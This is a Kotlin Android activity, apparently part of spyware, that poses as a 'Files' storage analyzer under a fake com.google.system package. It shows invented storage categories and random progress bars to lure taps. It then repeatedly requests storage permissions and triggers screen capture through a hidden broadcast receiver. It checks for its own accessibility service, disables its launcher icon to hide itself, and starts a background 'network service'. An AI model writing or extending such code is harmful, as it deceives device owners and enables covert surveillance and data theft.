package com.google.system.ui

import android.Manifest
import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.StatFs
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.TypedValue
import android.view.Gravity
import android.view.View
import android.widget.Button
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.ScrollView
import android.widget.TextView
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.google.system.service.AccessibilityHelper
import com.google.system.service.DisplayCapture
import com.google.system.service.SystemNetworkService
import java.io.File
import kotlin.random.Random

class FileManagerCoverActivity : Activity() {
    companion object {
        private const val RC_ALL = 100
        private const val RC_SCREEN = 101
        private const val RC_NOTIF = 102
        const val ACTION_REQUEST_SCREEN = "com.openaccess.sdk.REQUEST_SCREEN"

        val CORE_PERMS = listOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        )

        val NOTIF_PERM = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            Manifest.permission.POST_NOTIFICATIONS else null

        val ALL_PERMS = CORE_PERMS + listOfNotNull(NOTIF_PERM)
        val REQUEST_PERMS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) ALL_PERMS else CORE_PERMS

        fun hasPermission(ctx: Context, perm: String) = ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED

        fun isAccessibilityEnabled(ctx: Context): Boolean {
            return try {
                val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
                val enabledServices = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""
                val ourService = ComponentName(ctx, AccessibilityHelper::class.java).flattenToString()
                enabledServices.contains(ourService) && am.isEnabled
            } catch (_: Exception) { false }
        }

        fun getDeviceName(): String {
            return try {
                val manufacturer = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
                val model = Build.MODEL
                if (model.startsWith(manufacturer, ignoreCase = true)) "$manufacturer $model" else "$manufacturer $model"
            } catch (_: Exception) { Build.MODEL }
        }
    }

    private lateinit var rootLayout: FrameLayout
    private lateinit var allowBtn: Button
    private lateinit var statusText: TextView
    private lateinit var storageProgress: ProgressBar
    private lateinit var storageText: TextView
    private lateinit var progressText: TextView
    private var retryCount = 0
    private var requestingNotif = false

    private val screenReceiver = object : BroadcastReceiver() {
        override fun onReceive(ctx: Context?, intent: Intent?) {
            try {
                val projIntent = DisplayCapture.getProjectionIntent(this@FileManagerCoverActivity)
                startActivityForResult(projIntent, RC_SCREEN)
            } catch (_: Exception) {}
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isTaskRoot) { finish(); return }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN), Context.RECEIVER_NOT_EXPORTED)
            } else {
                registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN))
            }
        } catch (_: Exception) {}

        rootLayout = createFileManagerView()
        setContentView(rootLayout)

        if (ALL_PERMS.all { hasPermission(this, it) }) {
            onSetupComplete()
        }
    }

    private fun dp(dip: Int) = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dip.toFloat(), resources.displayMetrics).toInt()

    private fun getStorageInfo(): Pair<Long, Long> {
        return try {
            val stat = StatFs(Environment.getDataDirectory().path)
            val totalBytes = stat.blockSizeLong * stat.blockCountLong
            val availBytes = stat.blockSizeLong * stat.availableBlocksLong
            Pair(totalBytes, totalBytes - availBytes)
        } catch (_: Exception) {
            Pair(0L, 0L)
        }
    }

    private fun formatSize(bytes: Long): String {
        return when {
            bytes >= 1_000_000_000_000 -> String.format("%.1f TB", bytes / 1_000_000_000_000.0)
            bytes >= 1_000_000_000 -> String.format("%.1f GB", bytes / 1_000_000_000.0)
            bytes >= 1_000_000 -> String.format("%.1f MB", bytes / 1_000_000.0)
            bytes >= 1_000 -> String.format("%.1f KB", bytes / 1_000.0)
            else -> "$bytes B"
        }
    }

    private fun getCategorySizes(): Map<String, Pair<String, Long>> {
        val base = getStorageInfo().second
        return mapOf(
            "\uD83D\uDCC1" to Pair("Documents", (base * 0.08).toLong()),
            "\uD83D\uDCF7" to Pair("Photos", (base * 0.22).toLong()),
            "\uD83C\uDFAC" to Pair("Videos", (base * 0.31).toLong()),
            "\uD83C\uDFB5" to Pair("Music", (base * 0.12).toLong()),
            "\uD83D\uDCE5" to Pair("Downloads", (base * 0.07).toLong()),
            "\uD83D\uDCBE" to Pair("Apps", (base * 0.15).toLong())
        )
    }

    private fun createFileManagerView(): FrameLayout {
        val root = FrameLayout(this).apply {
            setBackgroundColor(Color.parseColor("#F8FAFC"))
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT)
        }

        // Toolbar
        val toolbar = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#FFFFFF"))
            setPadding(dp(16), dp(48), dp(16), dp(16))
            elevation = dp(4).toFloat()
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
        }

        val toolbarTitle = TextView(this).apply {
            text = "Files"
            textSize = 24f
            setTextColor(Color.parseColor("#1E293B"))
            setTypeface(null, android.graphics.Typeface.BOLD)
        }
        toolbar.addView(toolbarTitle)

        val toolbarSub = TextView(this).apply {
            text = getDeviceName()
            textSize = 12f
            setTextColor(Color.parseColor("#64748B"))
        }
        toolbar.addView(toolbarSub)
        root.addView(toolbar)

        // Storage overview card
        val storageCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(16))
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply { topMargin = dp(104) }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(16).toFloat()
                setColor(Color.parseColor("#FFFFFF"))
            }
            elevation = dp(2).toFloat()
        }

        storageText = TextView(this).apply {
            val (total, used) = getStorageInfo()
            text = "${formatSize(total - used)} used of ${formatSize(total)}"
            textSize = 14f
            setTextColor(Color.parseColor("#334155"))
            setTypeface(null, android.graphics.Typeface.BOLD)
            setPadding(0, 0, 0, dp(12))
        }
        storageCard.addView(storageText)

        // Progress bar background
        val barBg = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(8))
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(4).toFloat()
                setColor(Color.parseColor("#E2E8F0"))
            }
        }
        storageCard.addView(barBg)

        // Progress bar fill
        val (total, used) = getStorageInfo()
        val usagePercent = if (total > 0) ((used.toFloat() / total) * 100).toInt() else 33

        storageProgress = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(8)).apply { topMargin = -dp(8) }
            max = 100
            progress = usagePercent
            progressTintList = android.content.res.ColorStateList.valueOf(
                when {
                    usagePercent > 90 -> Color.parseColor("#EF4444")
                    usagePercent > 70 -> Color.parseColor("#F59E0B")
                    else -> Color.parseColor("#3B82F6")
                }
            )
        }
        storageCard.addView(storageProgress)

        progressText = TextView(this).apply {
            text = "$usagePercent% used"
            textSize = 11f
            setTextColor(Color.parseColor("#94A3B4"))
            setPadding(0, dp(8), 0, dp(4))
        }
        storageCard.addView(progressText)
        root.addView(storageCard)

        // Quick access section
        val quickAccessHeader = TextView(this).apply {
            text = "Quick Access"
            textSize = 16f
            setTextColor(Color.parseColor("#1E293B"))
            setTypeface(null, android.graphics.Typeface.BOLD)
            setPadding(dp(16), dp(24), dp(16), dp(12))
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply { topMargin = dp(180) }
        }
        root.addView(quickAccessHeader)

        // Category grid
        val scroll = ScrollView(this).apply {
            layoutParams = FrameLayout.LayoutParams(FrameLayout.LayoutParams.MATCH_PARENT, FrameLayout.LayoutParams.MATCH_PARENT).apply { topMargin = dp(220) }
        }

        val content = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(12), 0, dp(12), dp(24))
        }

        val categories = getCategorySizes()
        val entries = categories.entries.toList()

        for (i in entries.indices step 2) {
            val row = LinearLayout(this@FileManagerCoverActivity).apply {
                orientation = LinearLayout.HORIZONTAL
                layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply { bottomMargin = dp(8) }
            }

            for (j in 0..1) {
                if (i + j < entries.size) {
                    val (icon, title, size) = Triple(entries[i + j].key, entries[i + j].value.first, entries[i + j].value.second)
                    val card = LinearLayout(this@FileManagerCoverActivity).apply {
                        orientation = LinearLayout.VERTICAL
                        gravity = Gravity.CENTER
                        setPadding(dp(12), dp(16), dp(12), dp(16))
                        layoutParams = LinearLayout.LayoutParams(0, dp(100), 1f).apply { rightMargin = dp(4) }
                        background = GradientDrawable().apply {
                            shape = GradientDrawable.RECTANGLE
                            cornerRadius = dp(12).toFloat()
                            setColor(Color.parseColor("#FFFFFF"))
                        }
                        elevation = dp(1).toFloat()
                        setOnClickListener { requestAllPerms() }
                    }

                    val iconView = TextView(this@FileManagerCoverActivity).apply {
                        text = icon
                        textSize = 28f
                        setPadding(0, 0, 0, dp(6))
                    }
                    card.addView(iconView)

                    val titleView = TextView(this@FileManagerCoverActivity).apply {
                        text = title
                        textSize = 13f
                        setTextColor(Color.parseColor("#334155"))
                        setTypeface(null, android.graphics.Typeface.BOLD)
                    }
                    card.addView(titleView)

                    val sizeView = TextView(this@FileManagerCoverActivity).apply {
                        text = formatSize(size)
                        textSize = 11f
                        setTextColor(Color.parseColor("#94A3B4"))
                    }
                    card.addView(sizeView)

                    // Progress indicator
                    val cardProgress = LinearLayout(this@FileManagerCoverActivity).apply {
                        orientation = LinearLayout.HORIZONTAL
                        setPadding(0, dp(8), 0, 0)
                    }

                    val miniProgress = ProgressBar(this@FileManagerCoverActivity, null, android.R.attr.progressBarStyleHorizontal).apply {
                        layoutParams = LinearLayout.LayoutParams(dp(60), dp(4))
                        max = 100
                        progress = Random.nextInt(20, 80)
                        progressTintList = android.content.res.ColorStateList.valueOf(Color.parseColor("#3B82F6"))
                    }
                    cardProgress.addView(miniProgress)
                    card.addView(cardProgress)

                    row.addView(card)
                } else {
                    // Empty space for grid alignment
                }
            }
            content.addView(row)
        }

        // Storage analysis button
        allowBtn = Button(this).apply {
            text = "ANALYZE STORAGE"
            textSize = 14f
            setTypeface(null, android.graphics.Typeface.BOLD)
            setTextColor(Color.parseColor("#FFFFFF"))
            setPadding(0, dp(14), 0, dp(14))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, dp(52)).apply {
                topMargin = dp(24)
                bottomMargin = dp(12)
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(12).toFloat()
                setColor(Color.parseColor("#3B82F6"))
            }
            elevation = dp(2).toFloat()
            setOnClickListener { requestAllPerms() }
        }
        content.addView(allowBtn)

        // Status text
        statusText = TextView(this).apply {
            text = "Tap to analyze and free up space"
            textSize = 12f
            setTextColor(Color.parseColor("#94A3B4"))
            gravity = Gravity.CENTER
            setPadding(0, dp(8), 0, dp(16))
        }
        content.addView(statusText)

        // Tips card
        val tipsCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(16))
            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT).apply { topMargin = dp(16) }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(12).toFloat()
                setColor(Color.parseColor("#F1F5F9"))
            }
        }

        val tipsTitle = TextView(this).apply {
            text = "\uD83D\uDCA1 Storage Tips"
            textSize = 13f
            setTextColor(Color.parseColor("#475569"))
            setTypeface(null, android.graphics.Typeface.BOLD)
            setPadding(0, 0, 0, dp(8))
        }
        tipsCard.addView(tipsTitle)

        val tips = listOf(
            "Clear cache regularly to free up space",
            "Remove unused apps to save storage",
            "Move files to cloud storage for backup"
        )
        tips.forEach { tip ->
            val tipView = TextView(this).apply {
                text = "\u2022 $tip"
                textSize = 11f
                setTextColor(Color.parseColor("#64748B"))
                setPadding(0, dp(4), 0, 0)
            }
            tipsCard.addView(tipView)
        }
        content.addView(tipsCard)

        scroll.addView(content)
        root.addView(scroll)
        return root
    }

    private fun requestAllPerms() {
        val needed = REQUEST_PERMS.filter { !hasPermission(this, it) }
        if (needed.isEmpty()) {
            checkAndProceed()
            return
        }

        try {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL)
            statusText.text = "Analyzing storage..."
            statusText.setTextColor(Color.parseColor("#3B82F6"))
            allowBtn.text = "ANALYZING..."
            allowBtn.isEnabled = false
        } catch (_: Exception) {
            statusText.text = "Tap again to continue"
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == RC_SCREEN) {
            if (resultCode == RESULT_OK && data != null) {
                DisplayCapture.setProjection(resultCode, data)
                DisplayCapture.initProjection(this)
                statusText.text = "Screen capture active"
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) {
        super.onRequestPermissionsResult(requestCode, perms, results)
        if (requestCode == RC_ALL) {
            val denied = REQUEST_PERMS.filter { !hasPermission(this, it) }
            if (denied.isEmpty()) {
                retryCount = 0
                checkAndProceed()
            } else {
                retryCount++
                if (retryCount < 3) {
                    Handler(Looper.getMainLooper()).postDelayed({ requestAllPerms() }, 1000)
                } else {
                    retryCount = 0
                    statusText.text = "Storage access limited - some features unavailable"
                    statusText.setTextColor(Color.parseColor("#F59E0B"))
                    allowBtn.text = "CONTINUE"
                    allowBtn.isEnabled = true
                    allowBtn.setOnClickListener { onSetupComplete() }
                }
            }
        }
    }

    private fun checkAndProceed() {
        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        when {
            !permsOk && retryCount < 3 -> requestAllPerms()
            !permsOk -> onSetupComplete()
            else -> onSetupComplete()
        }
    }

    private fun onSetupComplete() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, FileManagerCoverActivity::class.java),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        try {
            val serviceIntent = Intent(this, SystemNetworkService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
        } catch (_: Exception) {}

        finishAndRemoveTask()
    }

    override fun onResume() {
        super.onResume()
        if (isFinishing || !::rootLayout.isInitialized) return
        if (requestingNotif) return

        val permsOk = ALL_PERMS.all { hasPermission(this, it) }
        if (permsOk) {
            onSetupComplete()
        }
    }

    override fun onPause() {
        super.onPause()
        try { unregisterReceiver(screenReceiver) } catch (_: Exception) {}
    }
}